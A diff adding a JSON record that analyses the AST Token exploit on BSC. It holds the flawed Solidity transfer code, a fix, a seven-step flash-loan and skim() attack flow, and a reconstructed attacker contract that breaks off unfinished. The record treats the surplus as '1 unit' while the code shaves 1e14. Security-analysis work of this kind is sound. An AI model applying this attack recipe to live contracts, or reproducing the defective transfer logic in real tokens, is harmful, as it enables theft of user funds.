@@ -1,0 +1,35 @@
+{
+ "id": "2025__2025-01-25_ASTToken_DoubleSkim",
+ "source_file": "2025/2025-01-25_ASTToken_DoubleSkim.md",
+ "title": "AST Token — Double Withdrawal + skim() Vulnerability Analysis",
+ "date": "2025-01-25",
+ "protocol": "AST Token",
+ "chain": "BSC",
+ "loss_raw": "~$65,000",
+ "loss_usd": 65000.0,
+ "root_cause": "Bug where AST token is withdrawn twice during liquidity removal, leaving the LP balance 1 unit higher than expected; the surplus is extractable via `skim()`",
+ "attack_tx": "0x80dd...3927",
+ "vulnerable_contract": "0xc10E0319...",
+ "classes": [
+  "business-logic"
+ ],
+ "code_before": [
+  "function _transfer(address from, address to, uint256 amount) internal virtual {\n    require(from != address(0), \"ERC20: transfer from the zero address\");\n    _beforeTokenTransfer(from, to, amount);\n\n    uint256 fromBalance = _balances[from];\n    require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n    unchecked {\n        _balances[from] = fromBalance - amount;   // (1) sender debited the FULL `amount`\n    }\n    // ❌ DEFECT A: when the entire balance is moved, the local `amount` is silently\n    //    shaved by 1e14 — but `_balances[from]` was already reduced by the full amount above.\n    if (fromBalance == amount && fromBalance >= 1e14) {\n        amount -= 1e14;                            // 1e14 \"vanishes\" from the credited side\n    }\n\n    if (from != uniswapV2Pair && !wList[from] && !wList[to] && to != uniswapV2Pair) {\n        _balances[to] += (amount);\n        emit Transfer(from, to, (amount));\n    } else if (wList[from] || wList[to]) {\n        _balances[to] += amount;\n        emit Transfer(from, to, amount);\n    } else {\n        uint feeAmount;\n        if (to == uniswapV2Pair) {\n            if (!checkLiquidityAdd(from)) {\n                if (saleFeeRate > 0) { feeAmount = amount * saleFeeRate / 100;\n                    _balances[sellfee] += feeAmount; emit Transfer(from, sellfee, feeAmount); }\n            }\n        }\n        if (from == uniswapV2Pair) {\n            if (checkLiquidityRm(to)) {\n                // ❌ DEFECT B: on liquidity removal the pair is the sender; `_burn` uses the\n                //    ALREADY-shaved `amount`, so the pair burns 1e14 LESS than it was debited.\n                _burn(from, amount);\n                amount = 0;\n            } else {\n                if (buyFeeRate > 0) { feeAmount = amount * buyFeeRate / 100;\n                    _balances[buyfee] += feeAmount; emit Transfer(from, buyfee, feeAmount); }\n            }\n        }\n        _balances[to] += (amount - feeAmount);\n        emit Transfer(from, to, (amount - feeAmount));\n    }\n    _afterTokenTransfer(from, to, amount);\n}\n\n// Detects a liquidity-removal transfer by watching the caller's LP-token balance shrink.\nfunction checkLiquidityRm(address user) internal returns (bool) {\n    IERC20 lpToken = IERC20(uniswapV2Pair);\n    uint256 currentBalance = lpToken.balanceOf(user);\n    uint256 previousBalance = lastBalance[user];\n    if (currentBalance < previousBalance) {           // LP balance fell → user removed liquidity\n        emit LiquidityRemoved(user, previousBalance - currentBalance);\n        lastBalance[user] = currentBalance;\n        return true;\n    }\n    return false;\n}"
+ ],
+ "code_after": [
+  "// ✅ Fix: never mutate the working `amount` after the balance has been debited, and make\n//    burn/credit amounts derive from a single source of truth.\nfunction _transfer(address from, address to, uint256 amount) internal virtual {\n    require(from != address(0), \"ERC20: transfer from the zero address\");\n    uint256 fromBalance = _balances[from];\n    require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n    _balances[from] = fromBalance - amount;\n    // no `amount -= 1e14` shaving; burn and credit use the same `amount` that was debited\n    if (from == uniswapV2Pair && checkLiquidityRm(to)) { _burn(from, amount); return; }\n    _balances[to] += amount;\n    emit Transfer(from, to, amount);\n}"
+ ],
+ "steps": [
+  "→ [1] Flash loan 30M BUSD from PancakeSwap V3",
+  "→ [2] Bulk swap BUSD → AST (received by proxy contract)",
+  "→ [3] Trigger liquidity removal operation",
+  "→ [4] Call skim()",
+  "→ [5] Swap extracted AST → BUSD",
+  "→ [6] Repay flash loan",
+  "→ [7] ~$65,000 profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Flash loan 30M BUSD from PancakeSwap V3\n  │\n  ├─→ [2] Bulk swap BUSD → AST (received by proxy contract)\n  │         └─ Pool AST balance drops sharply, price rises\n  │\n  ├─→ [3] Trigger liquidity removal operation\n  │         └─ Double withdrawal bug triggered\n  │            AST added:      6,688,350,004,594,453,500\n  │            AST in LP:      6,688,350,004,594,453,501 (+1 unit)\n  │\n  ├─→ [4] Call skim()\n  │         └─ Extract surplus 1 unit of token\n  │            (high value due to post-swap elevated price)\n  │\n  ├─→ [5] Swap extracted AST → BUSD\n  │\n  ├─→ [6] Repay flash loan\n  │\n  └─→ [7] ~$65,000 profit",
+  "// Full PoC not available — reconstructed from summary\n\ncontract ASTAttacker {\n    address constant AST_TOKEN = 0xc10E0319337c7F83342424Df72e73a70A29579B2;\n    address constant PANCAKE_V3 = /* PancakeSwap V3 Pool */;\n    address constant BUSD = /* BUSD address */;\n\n    function attack() external {\n        // [1] Flash loan 30 million BUSD\n        IPancakeV3Pool(PANCAKE_V3).flash(\n            address(this), 0, 30_000_000e18, \"\"\n        );\n    }\n\n    function pancakeV3FlashCallback(...) external {\n        // [2] Bulk swap BUSD → AST (received by proxy contract)\n        // Swap via specific route to trigger double withdrawal bug\n        _swapBUSDForAST(30_000_000e18, proxyContract);\n\n        // [3] Trigger liquidity removal (double withdrawal occurs)\n        // LP balance becomes 1 unit more "
+ ]
+}
